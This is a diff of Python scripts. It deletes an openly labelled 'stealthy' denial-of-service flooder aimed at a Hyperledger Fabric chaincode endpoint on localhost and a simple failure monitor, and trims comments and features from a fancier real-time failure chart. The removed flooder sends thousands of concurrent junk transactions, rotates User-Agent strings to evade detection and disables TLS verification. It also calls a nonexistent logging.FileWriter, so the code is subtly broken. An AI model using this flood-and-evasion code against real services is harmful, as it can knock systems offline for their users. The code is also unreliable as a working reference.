@@ -1,282 +1,3 @@
-import asyncio
-import json
-import random
-import string
-import time
-import logging
-from datetime import datetime
-import sys
-import ssl
-
-import aiohttp
-
-# --- Configuration ---
-FABRIC_URL = "https://localhost:7051"
-CHANNEL_ID = "mychannel"
-CHAINCODE_ID = "mycc"
-
-# Attack parameters
-TOTAL_TRANSACTIONS = 5000
-CONCURRENT_REQUESTS = 100
-ATTACK_TIMEOUT_SECONDS = 15
-
-# --- Logging Setup ---
-LOG_FILE = "dos_stealthy_flood.log" # Consistent log file name
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - [%(levelname)s] - %(message)s', # Added brackets for easier parsing
-    handlers=[
-        logging.FileWriter(LOG_FILE),
-    ]
-)
-logger = logging.getLogger(__name__)
-
-# --- User-Agent Pool ---
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46",
-]
-
-# --- Attack Logic ---
-def generate_malformed_payload() -> str:
-    """Generates a varied JSON payload."""
-    fcn = random.choice(["invalidDiscardFunction", "doNothing", "processJunk"])
-    random_data = ''.join(random.choices(string.ascii_letters + string.digits, k=1024))
-    return json.dumps({"fcn": fcn, "args": [random_data]})
-
-async def send_transaction(session: aiohttp.ClientSession, url: str, stats: dict):
-    """
-    Sends a single transaction with randomized, realistic headers to bypass detection.
-    """
-    try:
-        payload = generate_malformed_payload()
-        
-        headers = {
-            'Content-Type': 'application/json',
-            'User-Agent': random.choice(USER_AGENTS),
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Connection': 'keep-alive',
-        }
-        
-        async with session.post(url, data=payload, headers=headers, timeout=ATTACK_TIMEOUT_SECONDS) as response:
-            status = response.status
-            async with stats['lock']:
-                stats['sent'] += 1
-            logger.info(f"Sent request. Status: {status}")
-
-    except asyncio.TimeoutError:
-        async with stats['lock']:
-            stats['failed'] += 1
-        # --- MODIFICATION: Add a specific tag for failures ---
-        logger.warning("Request timed out. [FAILURE]")
-    except aiohttp.ClientError as e:
-        async with stats['lock']:
-            stats['failed'] += 1
-        # --- MODIFICATION: Add a specific tag for failures ---
-        logger.warning(f"Request failed: {e}. [FAILURE]")
-
-async def progress_reporter(stats: dict, stop_event: asyncio.Event):
-    """Prints progress to the console without blocking the event loop."""
-    while not stop_event.is_set():
-        async with stats['lock']:
-            sent = stats['sent']
-            failed = stats['failed']
-        sys.stdout.write(f"\rTotal Sent: {sent}, Total Failed: {failed}")
-        sys.stdout.flush()
-        try:
-            await asyncio.wait_for(stop_event.wait(), timeout=2.0)
-        except asyncio.TimeoutError:
-            continue
-
-async def run_dos_attack():
-    """Main async function to orchestrate the attack."""
-    print("="*50)
-    print(">>> STARTING STEALTHY DOS ATTACK (ASYNC) <<<")
-    print("="*50)
-    print(f"Target URL: {FABRIC_URL}")
-    print(f"Log File: {LOG_FILE}")
-    print(f"Total Transactions to Send: {TOTAL_TRANSACTIONS}")
-    print(f"Concurrent Requests: {CONCURRENT_REQUESTS}")
-    print("-"*50)
-    print("Run 'python attack_monitor.py' in another terminal to see live stats.")
-    print("="*50)
-
-    url = f"{FABRIC_URL}/channels/{CHANNEL_ID}/chaincodes/{CHAINCODE_ID}"
-    stats = {'sent': 0, 'failed': 0, 'lock': asyncio.Lock()}
-    start_time = datetime.now()
-    
-    ssl_context = ssl.create_default_context()
-    ssl_context.check_hostname = False
-    ssl_context.verify_mode = ssl.CERT_NONE
-    
-    connector = aiohttp.TCPConnector(
-        limit=CONCURRENT_REQUESTS, 
-        force_close=True,
-        ssl=ssl_context
-    )
-    
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = []
-        stop_event = asyncio.Event()
-        reporter_task = asyncio.create_task(progress_reporter(stats, stop_event))
-
-        for i in range(TOTAL_TRANSACTIONS):
-            task = asyncio.create_task(send_transaction(session, url, stats))
-            tasks.append(task)
-            
-            if len(tasks) >= CONCURRENT_REQUESTS:
-                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
-                tasks = list(pending)
-
-        if tasks:
-            await asyncio.wait(tasks)
-        
-        stop_event.set()
-        await reporter_task
-
-    end_time = datetime.now()
-    duration = end_time - start_time
-    print("\n" + "-"*50)
-    print(">>> ALL REQUESTS COMPLETED <<<")
-    print(f"Attack finished. Total duration: {duration}")
-    async with stats['lock']:
-        final_sent = stats['sent']
-        final_failed = stats['failed']
-    print(f"Final Tally - Total Sent: {final_sent}, Total Failed: {final_failed}")
-    print("="*50)
-    print(">>> ATTACK FINISHED <<<")
-    print("="*50)
-
-if __name__ == "__main__":
-    try:
-        asyncio.run(run_dos_attack())
-    except KeyboardInterrupt:
-        print("\n!!! ATTACK INTERRUPTED BY USER !!!")
-    except Exception as e:
-        print(f"\n!!! UNHANDLED ERROR IN MAIN SCRIPT: {e} !!!")
-        logger.error("Unhandled error in main script", exc_info=True)
-
-
-
-
--------------------
-
-import time
-from pathlib import Path
-
-from rich.console import Console
-from rich.live import Live
-from rich.panel import Panel
-
-LOG_FILE = "dos_stealthy_flood.log"
-MAX_POINTS_ON_CHART = 60  # last 60 seconds
-REFRESH_INTERVAL = 1.0     # seconds
-
-console = Console()
-
-
-def read_failures_since(log_path: Path, last_pos: int) -> tuple[int, int]:
-    """Read new lines from log file and count [FAILURE] occurrences."""
-    failures = 0
-    with log_path.open("r", encoding="utf-8", errors="ignore") as f:
-        f.seek(last_pos)
-        lines = f.readlines()
-        new_pos = f.tell()
-        for line in lines:
-            if "[FAILURE]" in line:
-                failures += 1
-    return failures, new_pos
-
-
-def render_chart(data_points: list[int]) -> Panel:
-    """Render a tiny bar chart as a string and wrap it in a Panel."""
-    if not data_points:
-        return Panel("Waiting for data...", title="DoS Monitor")
-
-    max_val = max(data_points) or 1
-    height = 10  # rows (y-axis levels)
-
-    lines = []
-
-    # Decide on integer interval step for labels
-    # (so the labels look like 0, 2, 4, 6... etc)
-    step = max(max_val // height, 1)
-
-    # Build chart from top row to bottom row
-    for level in range(height, 0, -1):
-        threshold = step * level
-        # label on the left (failures/sec)
-        label = f"{threshold:>3}"
-        row_chars = []
-        for v in data_points:
-            row_chars.append("█" if v >= threshold else " ")
-        lines.append(f"{label} |{''.join(row_chars)}")
-
-    # X-axis / info lines
-    # current window length
-    window_len = len(data_points)
-
-    # Simple summaries
-    last_5 = sum(data_points[-5:]) if window_len >= 5 else sum(data_points)
-    last_30 = sum(data_points[-30:]) if window_len >= 30 else sum(data_points)
-    total = sum(data_points)
-
-    info_line = (
-        f"\nLast {window_len}s | max/sec={max_val} | "
-        f"sum(5s)={last_5} | sum(30s)={last_30} | sum(all)={total}"
-    )
-
-    chart_text = "\n".join(lines) + info_line
-    return Panel(chart_text, title="Failures per Second")
-
-
-def main() -> None:
-    log_path = Path(LOG_FILE)
-    failure_counts: list[int] = []
-    last_pos = 0
-
-    # Wait for log file
-    while not log_path.exists():
-        console.print(f"Waiting for log file '{LOG_FILE}'...")
-        time.sleep(2)
-
-    with Live(render_chart(failure_counts), console=console, refresh_per_second=4) as live:
-        while True:
-            try:
-                failures, last_pos = read_failures_since(log_path, last_pos)
-            except FileNotFoundError:
-                # Reset if log file disappears
-                last_pos = 0
-                failure_counts.clear()
-                live.update(Panel("Log file not found, waiting...", title="DoS Monitor"))
-                time.sleep(2)
-                continue
-
-            # Append this second’s count
-            failure_counts.append(failures)
-            if len(failure_counts) > MAX_POINTS_ON_CHART:
-                failure_counts.pop(0)
-
-            # Update the live view
-            live.update(render_chart(failure_counts))
-
-            time.sleep(REFRESH_INTERVAL)
-
-
-if __name__ == "__main__":
-    main()
-
-
-
--------------------
-
 import time
 import math
 from pathlib import Path
@@ -300,9 +21,9 @@ HIGH_FAILURE_THRESHOLD = 10
 # Moving average window (seconds)
 MOVING_AVG_WINDOW = 10
 
-# Spike detection (factor * previous value)
+# Spike detection
 SPIKE_FACTOR = 2.0
-SPIKE_MIN_BASELINE = 3  # don't alert on tiny noise
+SPIKE_MIN_BASELINE = 3
 # ------------------------------------------
 
 
@@ -310,7 +31,6 @@ console = Console()
 
 
 def read_failures_since(log_path: Path, last_pos: int):
-    """Read new lines from log file and count [FAILURE] occurrences."""
     failures = 0
     with log_path.open("r", encoding="utf-8", errors="ignore") as f:
         f.seek(last_pos)
@@ -330,13 +50,11 @@ def moving_average(data, window):
 
 
 def render_bar_chart(data):
-    """Render a real-time bar chart with all the goodies."""
     if not data:
         return Panel("Waiting for data...", title="DoS Monitor")
 
-    # --- Autoresize / downsample by width ---
+    # --- Autoresize ---
     term_width = console.size.width
-    # room for label (4) + sep (" │" -> 2) + some padding / panel borders
     label_width = 4
     sep_width = 2
     padding = 6
@@ -345,52 +63,46 @@ def render_bar_chart(data):
     if len(data) > max_columns:
         data = data[-max_columns:]
 
-    # --- Basic stats ---
+    # --- Stats ---
     max_val = max(data) or 1
     min_val = min(data)
     last_val = data[-1]
     prev_val = data[-2] if len(data) >= 2 else None
     avg_val = moving_average(data, MOVING_AVG_WINDOW)
+    window_seconds = len(data)
 
-    # find indices of max/min (last occurrence)
+    # Find max/min indices
     max_idx = len(data) - 1 - list(reversed(data)).index(max_val)
     min_idx = len(data) - 1 - list(reversed(data)).index(min_val)
 
-    # --- Determine y-axis levels ---
-    # Limit vertical height to something reasonable for a terminal
+    # --- Y-axis levels ---
     max_height = 12
     step = max(1, math.ceil(max_val / max_height))
     levels = list(range(0, max_val + 1, step))
     if levels[-1] != max_val:
-        levels[-1] = max_val  # ensure top is exact max
-    # We'll render from top (highest) to bottom (0)
-    levels = sorted(set(levels), reverse=True)
+        levels[-1] = max_val
+    levels = sorted(levels, reverse=True)
 
-    # Determine which level is closest to the moving average, for the line
+    # Find moving average level
     avg_level = min(levels, key=lambda lv: abs(lv - avg_val))
 
     lines = []
 
     for level in levels:
-        # left axis label
         label = f"{level:>3} │"
         row_chars = []
 
         for i, v in enumerate(data):
             char = " "
 
-            # Moving average line overlay row
-            is_avg_row = (level == avg_level)
-
-            # Base bar logic
+            # Highlight bars
             if v >= level and level != 0:
-                # Color-coded bars
                 if v >= HIGH_FAILURE_THRESHOLD:
                     color = "red"
                 else:
                     color = "green"
 
-                # Max/min indicators override color
+                # Override for max/min points
                 if i == max_idx:
                     color = "yellow"
                 elif i == min_idx:
@@ -398,43 +110,33 @@ def render_bar_chart(data):
 
                 char = f"[{color}]█[/]"
 
-            # If this is the moving average row, draw a line where there is no bar
-            if is_avg_row and v < level:
-                # light dot for moving average line
+            # Moving average line
+            if level == avg_level and v < level:
                 char = "[bright_blue]·[/]"
 
             row_chars.append(char)
 
         lines.append(label + "".join(row_chars))
 
-    # --- X-axis and labels ---
+    # X-axis (NO TIME TICKS)
     axis = "    └" + ("─" * len(data))
 
-    # We'll just show an index scale modulo 10 for compactness
-    idx_labels = "".join(str((i + 1) % 10) for i in range(len(data)))
-    time_labels = "     " + idx_labels
-
-    # --- Summary / info lines ---
-    window_seconds = len(data)
-    last_n_label = f"Last {window_seconds} seconds (most recent on the right)"
-
+    # Summary info
     max_info = f"max={max_val} at t=-{window_seconds - 1 - max_idx}s"
     min_info = f"min={min_val} at t=-{window_seconds - 1 - min_idx}s"
     avg_info = f"{MOVING_AVG_WINDOW}s MA={avg_val:.2f}"
+    last_n_label = f"Last {window_seconds} seconds"
 
-    # Spike alert
     spike_msg = ""
     if prev_val is not None:
         if last_val >= SPIKE_MIN_BASELINE and last_val >= prev_val * SPIKE_FACTOR:
-            spike_msg = f"[bold red]SPIKE![/] last={last_val} prev={prev_val}"
+            spike_msg = f"[bold red]SPIKE! last={last_val} prev={prev_val}[/]"
 
-    info_line = (
-        f"{last_n_label} | {max_info} | {min_info} | {avg_info}"
-    )
+    info_line = f"{last_n_label} | {max_info} | {min_info} | {avg_info}"
     if spike_msg:
         info_line += " | " + spike_msg
 
-    chart = "\n".join(lines) + "\n" + axis + "\n" + time_labels + "\n\n" + info_line
+    chart = "\n".join(lines) + "\n" + axis + "\n\n" + info_line
 
     return Panel(chart, title="Failures per Second (Realtime)")
 
@@ -444,7 +146,6 @@ def main():
     failure_counts = []
     last_pos = 0
 
-    # Wait for log file
     while not log_path.exists():
         console.print(f"Waiting for log file '{LOG_FILE}'...")
         time.sleep(2)
@@ -460,17 +161,16 @@ def main():
                 time.sleep(2)
                 continue
 
-            # Smooth scrolling window
             failure_counts.append(failures)
             if len(failure_counts) > MAX_POINTS_ON_CHART:
                 failure_counts.pop(0)
 
             live.update(render_bar_chart(failure_counts))
-
             time.sleep(REFRESH_INTERVAL)
 
 
 if __name__ == "__main__":
     main()
+
 
 
